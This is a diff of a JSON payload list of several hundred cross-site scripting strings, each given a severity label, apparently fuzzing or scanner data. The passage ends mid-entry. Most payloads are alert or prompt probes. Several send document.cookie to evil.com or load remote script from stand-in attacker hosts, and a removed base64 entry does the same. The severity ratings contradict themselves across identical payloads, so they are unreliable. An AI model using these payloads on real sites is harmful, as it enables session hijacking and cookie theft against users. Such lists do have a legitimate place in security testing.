@@ -1,50 +1,2202 @@
 [
-    {
-        "payload": "<script>alert(1)</script>",
-        "severity": "high"
-    },
-    {
-        "payload": "javascript:alert(document.domain)",
-        "severity": "medium"
-    },
-    {
-        "payload": "'><img src=x onerror=alert(1)>",
-        "severity": "high"
-    },
-    {
-        "payload": "\"onfocus=\"alert(1) autofocus=\"",
-        "severity": "medium"
-    },
-    {
-        "payload": "<svg/onload=alert(1)>",
-        "severity": "high"
-    },
-    {
-        "payload": "{{constructor.constructor('alert(1)')()}}",
-        "severity": "critical"
-    },
-    {
-        "payload": "<iframe srcdoc=\"<img src=x:x onerror=alert(1)>",
-        "severity": "high"
-    },
-    {
-        "payload": "javascript:eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9ldmlsLXNpdGUuY29tL2Nvb2tpZS1zdGVhbGVyP2M9Iitkb2N1bWVudC5jb29raWU='))",
-        "severity": "critical"
-    },
-    {
-        "payload": "<details/open/ontoggle=alert(1)>",
-        "severity": "medium"
-    },
-    {
-        "payload": "<video><source onerror=alert(1)>",
-        "severity": "high"
-    },
-    {
-        "payload": "{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}",
-        "severity": "critical"
-    },
-    {
-        "payload": "<form><button formaction=javascript:alert(1)>XSS",
-        "severity": "high"
-    }
+  {
+    "payload": "<div onclick='confirm(document.cookie)'>Click</div>",
+    "severity": "high"
+  },
+  {
+    "payload": "<div style=background:url('javascript:prompt(512)')>",
+    "severity": "low"
+  },
+  {
+    "payload": "<script src='//evil.com/xss.js'></script>",
+    "severity": "high"
+  },
+  {
+    "payload": "<a href='javascript:confirm(672)'>click</a>",
+    "severity": "high"
+  },
+  {
+    "payload": "<script>confirm(10)</script>",
+    "severity": "high"
+  },
+  {
+    "payload": "<meta charset='x' onerror='prompt(906)'>",
+    "severity": "low"
+  },
+  {
+    "payload": "<img src='data:image/svg+xml,<svg onload=prompt(136)>'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<img src=x onerror=prompt(357)>",
+    "severity": "critical"
+  },
+  {
+    "payload": "javascript:prompt(document.domain)",
+    "severity": "medium"
+  },
+  {
+    "payload": "<object data='javascript:alert(819)'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<a href='javascript:alert(566)'>click</a>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<img src=x onerror=prompt(513)>",
+    "severity": "low"
+  },
+  {
+    "payload": "<img src='716' onerror='prompt(716)'>",
+    "severity": "high"
+  },
+  {
+    "payload": "<svg><script>alert(636)</script></svg>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<meta charset='x' onerror='alert(657)'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<img src=x onerror=alert(568)>",
+    "severity": "high"
+  },
+  {
+    "payload": "<svg><a xlink:href='javascript:alert(723)'>X</a></svg>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<form><button formaction='javascript:alert(471)'>Click</button></form>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<img src=x onerror=alert(723)>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<img src='x' onerror='this.onerror=null;alert(26)'>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<img src='x' onerror='this.onerror=null;confirm(140)'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<svg><desc><![CDATA[</desc><script>prompt(777)</script>]]></svg>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<img src='x' onerror='this.onerror=null;alert(157)'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<div style=background:url('javascript:confirm(94)')>",
+    "severity": "low"
+  },
+  {
+    "payload": "<meta charset='x' onerror='prompt(328)'>",
+    "severity": "low"
+  },
+  {
+    "payload": "<img src='x' onerror='this.onerror=null;alert(941)'>",
+    "severity": "high"
+  },
+  {
+    "payload": "<img src='data:image/svg+xml,<svg onload=alert(654)>'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<video><source onerror='javascript:confirm(860)'></video>",
+    "severity": "low"
+  },
+  {
+    "payload": "<script>document.write('<script>prompt(193)</script>')</script>",
+    "severity": "low"
+  },
+  {
+    "payload": "<link rel='stylesheet' href='javascript:alert(416)'>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<script>location='https://evil.com?cookie='+document.cookie</script>",
+    "severity": "high"
+  },
+  {
+    "payload": "<img src='x' onerror='this.onerror=null;confirm(280)'>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<script>document.write('<script>prompt(28)</script>')</script>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<link rel='stylesheet' href='javascript:confirm(475)'>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<link rel='stylesheet' href='javascript:confirm(645)'>",
+    "severity": "high"
+  },
+  {
+    "payload": "<img src='588' onerror='prompt(588)'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<textarea onfocus=confirm(338)>",
+    "severity": "low"
+  },
+  {
+    "payload": "<img src='x' onerror='this.onerror=null;prompt(842)'>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<script>prompt(347)</script>",
+    "severity": "high"
+  },
+  {
+    "payload": "<body onload=alert('XSS')>",
+    "severity": "low"
+  },
+  {
+    "payload": "<button onclick=confirm(97)>click</button>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<a href='javascript:confirm(4)'>click</a>",
+    "severity": "high"
+  },
+  {
+    "payload": "<div style=background:url('javascript:alert(297)')>",
+    "severity": "high"
+  },
+  {
+    "payload": "<iframe src='javascript:prompt(659)'>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<script src='//evil.com/xss.js'></script>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<div onpointerover=alert(881)>Hover me</div>",
+    "severity": "low"
+  },
+  {
+    "payload": "<img src='267' onerror='prompt(267)'>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<script src='//evil.com/xss.js'></script>",
+    "severity": "low"
+  },
+  {
+    "payload": "<input type='image' src='x' onerror=alert(58)>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<div style='width: expression(confirm(502));'>",
+    "severity": "high"
+  },
+  {
+    "payload": "<img src=x:confirm(260)>",
+    "severity": "low"
+  },
+  {
+    "payload": "<img src='x' onerror='this.onerror=null;alert(503)'>",
+    "severity": "high"
+  },
+  {
+    "payload": "<script>location='https://evil.com?cookie='+document.cookie</script>",
+    "severity": "high"
+  },
+  {
+    "payload": "<img src=x onerror=alert(/XSS/.source)>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<script src='//evil.com/xss.js'></script>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<iframe src='javascript:confirm(676)'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<meta http-equiv='refresh' content='0;url=javascript:prompt(350)'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<img src=# onmouseover='prompt(173)'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<div onpointerover=alert(813)>Hover me</div>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<svg><script>prompt(919)</script></svg>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<button onclick=prompt(769)>click</button>",
+    "severity": "critical"
+  },
+  {
+    "payload": "javascript:confirm(document.domain)",
+    "severity": "medium"
+  },
+  {
+    "payload": "<textarea onfocus=confirm(992)>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<script>document.write('<script>alert(41)</script>')</script>",
+    "severity": "low"
+  },
+  {
+    "payload": "<svg><a xlink:href='javascript:confirm(563)'>X</a></svg>",
+    "severity": "low"
+  },
+  {
+    "payload": "<embed src='data:text/html,<script>alert(177)</script>'>",
+    "severity": "high"
+  },
+  {
+    "payload": "<iframe src='javascript:alert(356)'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<img src=# onmouseover='prompt(533)'>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<table background='javascript:alert(421)'>",
+    "severity": "low"
+  },
+  {
+    "payload": "<b onmouseover=confirm(101)>XSS</b>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<svg><script>prompt(616)</script></svg>",
+    "severity": "high"
+  },
+  {
+    "payload": "javascript:confirm(document.domain)",
+    "severity": "high"
+  },
+  {
+    "payload": "<img src=x onerror=alert(/XSS/.source)>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<details open ontoggle=alert(265)>",
+    "severity": "high"
+  },
+  {
+    "payload": "<img src='x' onerror='this.onerror=null;alert(641)'>",
+    "severity": "high"
+  },
+  {
+    "payload": "<textarea onfocus=confirm(713)>",
+    "severity": "high"
+  },
+  {
+    "payload": "<div style='width: expression(confirm(210));'>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<meta http-equiv='refresh' content='0;url=javascript:prompt(41)'>",
+    "severity": "low"
+  },
+  {
+    "payload": "<object data='javascript:alert(392)'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<body onload=alert('XSS')>",
+    "severity": "low"
+  },
+  {
+    "payload": "<div style=background:url('javascript:confirm(66)')>",
+    "severity": "high"
+  },
+  {
+    "payload": "<marquee onstart=confirm(595)>XSS</marquee>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<meta http-equiv='refresh' content='0;url=javascript:alert(179)'>",
+    "severity": "high"
+  },
+  {
+    "payload": "<script src='data:text/javascript,alert(23)'></script>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<img src=x:alert(952)>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<video><source onerror='javascript:prompt(495)'></video>",
+    "severity": "high"
+  },
+  {
+    "payload": "<iframe src='javascript:alert(421)'>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<input autofocus onfocus=alert(890)>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<isindex prompt='XSS' onfocus=prompt(674)>",
+    "severity": "high"
+  },
+  {
+    "payload": "<script src='data:text/javascript,confirm(145)'></script>",
+    "severity": "high"
+  },
+  {
+    "payload": "<img src=x:confirm(704)>",
+    "severity": "low"
+  },
+  {
+    "payload": "<script>confirm(215)</script>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<img src=x onerror=confirm(762)>",
+    "severity": "high"
+  },
+  {
+    "payload": "<img src='data:image/svg+xml,<svg onload=alert(891)>'>",
+    "severity": "low"
+  },
+  {
+    "payload": "<script src='//evil.com/xss.js'></script>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<div onpointerover=confirm(844)>Hover me</div>",
+    "severity": "high"
+  },
+  {
+    "payload": "<details open ontoggle=confirm(336)>",
+    "severity": "high"
+  },
+  {
+    "payload": "<div onpointerover=confirm(885)>Hover me</div>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<script>location='https://evil.com?cookie='+document.cookie</script>",
+    "severity": "high"
+  },
+  {
+    "payload": "<audio src onerror=confirm(7)>",
+    "severity": "low"
+  },
+  {
+    "payload": "<svg><script>confirm(62)</script></svg>",
+    "severity": "low"
+  },
+  {
+    "payload": "<meta charset='x' onerror='alert(382)'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<svg><desc><![CDATA[</desc><script>alert(346)</script>]]></svg>",
+    "severity": "low"
+  },
+  {
+    "payload": "<iframe srcdoc='<script>alert(289)</script>'>",
+    "severity": "high"
+  },
+  {
+    "payload": "<img src=# onmouseover='prompt(804)'>",
+    "severity": "low"
+  },
+  {
+    "payload": "<a href='javascript:confirm(717)'>click</a>",
+    "severity": "high"
+  },
+  {
+    "payload": "<script>document.write('<script>confirm(544)</script>')</script>",
+    "severity": "low"
+  },
+  {
+    "payload": "<meta http-equiv='refresh' content='0;url=javascript:alert(607)'>",
+    "severity": "high"
+  },
+  {
+    "payload": "<img src=x:confirm(543)>",
+    "severity": "critical"
+  },
+  {
+    "payload": "javascript:prompt(document.domain)",
+    "severity": "high"
+  },
+  {
+    "payload": "<img src='x' onerror='eval(`alert(355)`)'>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<img src=x:confirm(448)>",
+    "severity": "high"
+  },
+  {
+    "payload": "<img src='x' onerror=confirm(89)>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<b onmouseover=alert(117)>XSS</b>",
+    "severity": "high"
+  },
+  {
+    "payload": "<img src=x:confirm(499)>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<img src=x:alert(693)>",
+    "severity": "high"
+  },
+  {
+    "payload": "<form><button formaction='javascript:prompt(242)'>Click</button></form>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<object type='text/x-scriptlet' data='http://attacker/xss.sct'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<b onmouseover=confirm(857)>XSS</b>",
+    "severity": "high"
+  },
+  {
+    "payload": "<input autofocus onfocus=confirm(787)>",
+    "severity": "high"
+  },
+  {
+    "payload": "<div onpointerover=confirm(539)>Hover me</div>",
+    "severity": "low"
+  },
+  {
+    "payload": "<div style=background:url('javascript:alert(92)')>",
+    "severity": "low"
+  },
+  {
+    "payload": "<div onclick='prompt(document.cookie)'>Click</div>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<div style=background:url('javascript:confirm(217)')>",
+    "severity": "high"
+  },
+  {
+    "payload": "<iframe srcdoc='<script>alert(374)</script>'>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<input type='image' src='x' onerror=prompt(313)>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<style>@import 'javascript:prompt(942)';</style>",
+    "severity": "high"
+  },
+  {
+    "payload": "<div style=background:url('javascript:prompt(556)')>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<marquee onstart=prompt(947)>XSS</marquee>",
+    "severity": "high"
+  },
+  {
+    "payload": "<div onpointerover=alert(823)>Hover me</div>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<input type='image' src='x' onerror=alert(173)>",
+    "severity": "low"
+  },
+  {
+    "payload": "<svg/onload=confirm(432)>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<script>prompt(330)</script>",
+    "severity": "low"
+  },
+  {
+    "payload": "<isindex prompt='XSS' onfocus=alert(935)>",
+    "severity": "high"
+  },
+  {
+    "payload": "<isindex prompt='XSS' onfocus=confirm(102)>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<video><source onerror='javascript:confirm(811)'></video>",
+    "severity": "high"
+  },
+  {
+    "payload": "<script src='//evil.com/xss.js'></script>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<img src=x:confirm(795)>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<marquee onstart=confirm(227)>XSS</marquee>",
+    "severity": "high"
+  },
+  {
+    "payload": "<form><button formaction='javascript:alert(514)'>Click</button></form>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<img src='x' onerror=confirm(477)>",
+    "severity": "low"
+  },
+  {
+    "payload": "<table background='javascript:alert(862)'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<style>@import 'javascript:alert(249)';</style>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<img src=x onerror=alert(777)>",
+    "severity": "low"
+  },
+  {
+    "payload": "<textarea onfocus=prompt(933)>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<img src=x:confirm(91)>",
+    "severity": "high"
+  },
+  {
+    "payload": "<svg><script>confirm(253)</script></svg>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<script>prompt(688)</script>",
+    "severity": "high"
+  },
+  {
+    "payload": "javascript:prompt(document.domain)",
+    "severity": "critical"
+  },
+  {
+    "payload": "<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<img src=x onerror=alert(988)>",
+    "severity": "high"
+  },
+  {
+    "payload": "<img src=x onerror=confirm(/XSS/.source)>",
+    "severity": "high"
+  },
+  {
+    "payload": "<img src='data:image/svg+xml,<svg onload=confirm(742)>'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<img src=x:alert(631)>",
+    "severity": "high"
+  },
+  {
+    "payload": "<b onmouseover=alert(198)>XSS</b>",
+    "severity": "low"
+  },
+  {
+    "payload": "<iframe src='javascript:confirm(840)'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<img src=x onerror=confirm(/XSS/.source)>",
+    "severity": "low"
+  },
+  {
+    "payload": "<isindex prompt='XSS' onfocus=prompt(697)>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<img src='data:image/svg+xml,<svg onload=alert(894)>'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<script src='data:text/javascript,confirm(909)'></script>",
+    "severity": "low"
+  },
+  {
+    "payload": "<input autofocus onfocus=alert(357)>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<iframe srcdoc='<script>alert(756)</script>'>",
+    "severity": "low"
+  },
+  {
+    "payload": "<img src=x onerror=confirm(/XSS/.source)>",
+    "severity": "low"
+  },
+  {
+    "payload": "<object type='text/x-scriptlet' data='http://attacker/xss.sct'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<div onclick='prompt(document.cookie)'>Click</div>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<table background='javascript:confirm(102)'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<b onmouseover=confirm(577)>XSS</b>",
+    "severity": "low"
+  },
+  {
+    "payload": "<input autofocus onfocus=prompt(24)>",
+    "severity": "high"
+  },
+  {
+    "payload": "<object data='javascript:confirm(460)'>",
+    "severity": "high"
+  },
+  {
+    "payload": "<textarea onfocus=confirm(339)>",
+    "severity": "high"
+  },
+  {
+    "payload": "<svg><desc><![CDATA[</desc><script>alert(873)</script>]]></svg>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<svg><a xlink:href='javascript:alert(873)'>X</a></svg>",
+    "severity": "high"
+  },
+  {
+    "payload": "<link rel='stylesheet' href='javascript:confirm(843)'>",
+    "severity": "high"
+  },
+  {
+    "payload": "<svg><desc><![CDATA[</desc><script>alert(648)</script>]]></svg>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<img src=x:confirm(339)>",
+    "severity": "low"
+  },
+  {
+    "payload": "<div style='width: expression(confirm(221));'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<style>@import 'javascript:alert(811)';</style>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<iframe srcdoc='<script>alert(946)</script>'>",
+    "severity": "high"
+  },
+  {
+    "payload": "<meta http-equiv='refresh' content='0;url=javascript:alert(923)'>",
+    "severity": "high"
+  },
+  {
+    "payload": "<script src='//evil.com/xss.js'></script>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<meta charset='x' onerror='confirm(582)'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<link rel='stylesheet' href='javascript:alert(962)'>",
+    "severity": "low"
+  },
+  {
+    "payload": "<a href='javascript:prompt(233)'>click</a>",
+    "severity": "high"
+  },
+  {
+    "payload": "<input autofocus onfocus=prompt(233)>",
+    "severity": "low"
+  },
+  {
+    "payload": "<script>document.write('<script>prompt(910)</script>')</script>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<style>@import 'javascript:alert(879)';</style>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<div onclick='confirm(document.cookie)'>Click</div>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<script>prompt(319)</script>",
+    "severity": "low"
+  },
+  {
+    "payload": "<input type='image' src='x' onerror=confirm(232)>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<img src=x:confirm(184)>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<isindex prompt='XSS' onfocus=alert(790)>",
+    "severity": "low"
+  },
+  {
+    "payload": "<button onclick=alert(822)>click</button>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<img src=x onerror=prompt(255)>",
+    "severity": "low"
+  },
+  {
+    "payload": "<meta http-equiv='refresh' content='0;url=javascript:prompt(112)'>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<script src='data:text/javascript,confirm(838)'></script>",
+    "severity": "low"
+  },
+  {
+    "payload": "<audio src onerror=alert(12)>",
+    "severity": "high"
+  },
+  {
+    "payload": "<div onpointerover=prompt(402)>Hover me</div>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<b onmouseover=confirm(341)>XSS</b>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<button onclick=alert(353)>click</button>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<script>alert(659)</script>",
+    "severity": "high"
+  },
+  {
+    "payload": "<svg/onload=alert(142)>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<object data='javascript:confirm(310)'>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<script>document.write('<script>alert(297)</script>')</script>",
+    "severity": "high"
+  },
+  {
+    "payload": "<div style=background:url('javascript:confirm(821)')>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<table background='javascript:prompt(706)'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<img src=x onerror=alert(322)>",
+    "severity": "high"
+  },
+  {
+    "payload": "<object data='javascript:alert(227)'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<svg><desc><![CDATA[</desc><script>alert(246)</script>]]></svg>",
+    "severity": "high"
+  },
+  {
+    "payload": "<img src='x' onerror=confirm(850)>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<iframe src='javascript:alert(708)'>",
+    "severity": "high"
+  },
+  {
+    "payload": "<div onclick='confirm(document.cookie)'>Click</div>",
+    "severity": "low"
+  },
+  {
+    "payload": "<table background='javascript:confirm(342)'>",
+    "severity": "high"
+  },
+  {
+    "payload": "<table background='javascript:alert(414)'>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<img src=# onmouseover='prompt(719)'>",
+    "severity": "high"
+  },
+  {
+    "payload": "<svg><desc><![CDATA[</desc><script>confirm(35)</script>]]></svg>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<iframe srcdoc='<script>confirm(22)</script>'>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<img src='data:image/svg+xml,<svg onload=alert(212)>'>",
+    "severity": "low"
+  },
+  {
+    "payload": "<table background='javascript:alert(61)'>",
+    "severity": "high"
+  },
+  {
+    "payload": "<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>",
+    "severity": "high"
+  },
+  {
+    "payload": "<img src=x onerror=confirm(/XSS/.source)>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<script>document.write('<script>confirm(401)</script>')</script>",
+    "severity": "high"
+  },
+  {
+    "payload": "<img src='data:image/svg+xml,<svg onload=confirm(200)>'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<svg><a xlink:href='javascript:confirm(894)'>X</a></svg>",
+    "severity": "low"
+  },
+  {
+    "payload": "<textarea onfocus=prompt(307)>",
+    "severity": "low"
+  },
+  {
+    "payload": "<div style='width: expression(prompt(178));'>",
+    "severity": "low"
+  },
+  {
+    "payload": "<img src=x:confirm(465)>",
+    "severity": "high"
+  },
+  {
+    "payload": "<iframe src='javascript:alert(790)'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<img src=# onmouseover='confirm(346)'>",
+    "severity": "high"
+  },
+  {
+    "payload": "<meta charset='x' onerror='prompt(182)'>",
+    "severity": "high"
+  },
+  {
+    "payload": "<img src='x' onerror=confirm(734)>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<div style=background:url('javascript:alert(464)')>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<script>location='https://evil.com?cookie='+document.cookie</script>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<img src='x' onerror=confirm(730)>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<div style=background:url('javascript:alert(408)')>",
+    "severity": "low"
+  },
+  {
+    "payload": "<img src=# onmouseover='prompt(980)'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<iframe src='javascript:prompt(741)'>",
+    "severity": "high"
+  },
+  {
+    "payload": "<img src=# onmouseover='alert(983)'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<img src=x:alert(160)>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<marquee onstart=prompt(777)>XSS</marquee>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<video><source onerror='javascript:prompt(572)'></video>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<b onmouseover=alert(548)>XSS</b>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<img src='data:image/svg+xml,<svg onload=confirm(802)>'>",
+    "severity": "low"
+  },
+  {
+    "payload": "<svg><script>confirm(194)</script></svg>",
+    "severity": "high"
+  },
+  {
+    "payload": "<script src='data:text/javascript,alert(733)'></script>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<svg><script>confirm(666)</script></svg>",
+    "severity": "low"
+  },
+  {
+    "payload": "<div style='width: expression(prompt(124));'>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<math><mi><script>alert(721)</script></mi></math>",
+    "severity": "high"
+  },
+  {
+    "payload": "<meta http-equiv='refresh' content='0;url=javascript:prompt(445)'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<iframe src='javascript:confirm(182)'>",
+    "severity": "high"
+  },
+  {
+    "payload": "<svg><a xlink:href='javascript:prompt(576)'>X</a></svg>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<object data='javascript:alert(638)'>",
+    "severity": "low"
+  },
+  {
+    "payload": "<link rel='stylesheet' href='javascript:prompt(83)'>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<img src='x' onerror=confirm(382)>",
+    "severity": "high"
+  },
+  {
+    "payload": "<svg><desc><![CDATA[</desc><script>prompt(571)</script>]]></svg>",
+    "severity": "low"
+  },
+  {
+    "payload": "<link rel='stylesheet' href='javascript:prompt(395)'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<div style=background:url('javascript:prompt(376)')>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<img src=x:confirm(385)>",
+    "severity": "low"
+  },
+  {
+    "payload": "<body onload=alert('XSS')>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<object data='javascript:confirm(778)'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<img src='x' onerror='this.onerror=null;prompt(429)'>",
+    "severity": "high"
+  },
+  {
+    "payload": "<img src='637' onerror='prompt(637)'>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<iframe src='javascript:prompt(311)'>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<img src='692' onerror='prompt(692)'>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<img src=x onerror=confirm(412)>",
+    "severity": "high"
+  },
+  {
+    "payload": "<iframe src='javascript:confirm(55)'>",
+    "severity": "high"
+  },
+  {
+    "payload": "<img src='x' onerror='this.onerror=null;prompt(382)'>",
+    "severity": "high"
+  },
+  {
+    "payload": "<textarea onfocus=alert(331)>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<body onload=prompt('XSS')>",
+    "severity": "low"
+  },
+  {
+    "payload": "<link rel='stylesheet' href='javascript:alert(777)'>",
+    "severity": "high"
+  },
+  {
+    "payload": "<script>location='https://evil.com?cookie='+document.cookie</script>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<svg><script>prompt(22)</script></svg>",
+    "severity": "high"
+  },
+  {
+    "payload": "<script>location='https://evil.com?cookie='+document.cookie</script>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<img src='x' onerror='this.onerror=null;alert(544)'>",
+    "severity": "low"
+  },
+  {
+    "payload": "<img src='data:image/svg+xml,<svg onload=alert(419)>'>",
+    "severity": "low"
+  },
+  {
+    "payload": "<isindex prompt='XSS' onfocus=alert(606)>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<script src='//evil.com/xss.js'></script>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<audio src onerror=alert(692)>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<details open ontoggle=confirm(237)>",
+    "severity": "high"
+  },
+  {
+    "payload": "<form><button formaction='javascript:prompt(66)'>Click</button></form>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<script>document.write('<script>alert(220)</script>')</script>",
+    "severity": "low"
+  },
+  {
+    "payload": "<img src=x onerror=confirm(535)>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<img src=x onerror=prompt(/XSS/.source)>",
+    "severity": "low"
+  },
+  {
+    "payload": "<svg><script>prompt(788)</script></svg>",
+    "severity": "high"
+  },
+  {
+    "payload": "<style>@import 'javascript:prompt(866)';</style>",
+    "severity": "low"
+  },
+  {
+    "payload": "<style>@import 'javascript:prompt(836)';</style>",
+    "severity": "high"
+  },
+  {
+    "payload": "<div style='width: expression(confirm(106));'>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<link rel='stylesheet' href='javascript:alert(691)'>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<embed src='data:text/html,<script>prompt(267)</script>'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<audio src onerror=prompt(770)>",
+    "severity": "high"
+  },
+  {
+    "payload": "<details open ontoggle=prompt(919)>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<img src='850' onerror='prompt(850)'>",
+    "severity": "high"
+  },
+  {
+    "payload": "javascript:prompt(document.domain)",
+    "severity": "low"
+  },
+  {
+    "payload": "<body onload=confirm('XSS')>",
+    "severity": "high"
+  },
+  {
+    "payload": "<b onmouseover=prompt(991)>XSS</b>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<math><mi><script>confirm(1)</script></mi></math>",
